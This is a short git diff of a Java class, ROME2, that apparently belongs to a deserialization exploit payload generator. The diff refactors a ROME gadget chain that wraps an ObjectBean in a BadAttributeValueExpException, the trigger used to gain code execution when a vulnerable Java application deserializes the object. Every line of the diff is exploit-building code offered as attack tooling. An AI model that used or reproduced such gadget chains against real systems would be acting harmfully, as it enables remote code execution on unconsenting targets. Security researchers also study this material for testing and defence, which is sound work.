@@ -1,5 +1,6 @@
 package com.ppp.chain.rome;
 
+import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
@@ -45,9 +46,8 @@ public class ROME2 implements ObjectPayload<Object> {
     public Object getChain(Class cls, Object object) throws Exception {
         ObjectBean delegate = new ObjectBean(cls, object);
 
-        BadAttributeValueExpException b = new BadAttributeValueExpException(null);
-        Reflections.setFieldValue(b, "val", delegate);
+        BadAttributeValueExpException badAttributeValueExpException = KickOff.badAttributeValueExpException(delegate);
 
-        return b;
+        return badAttributeValueExpException;
     }
 }
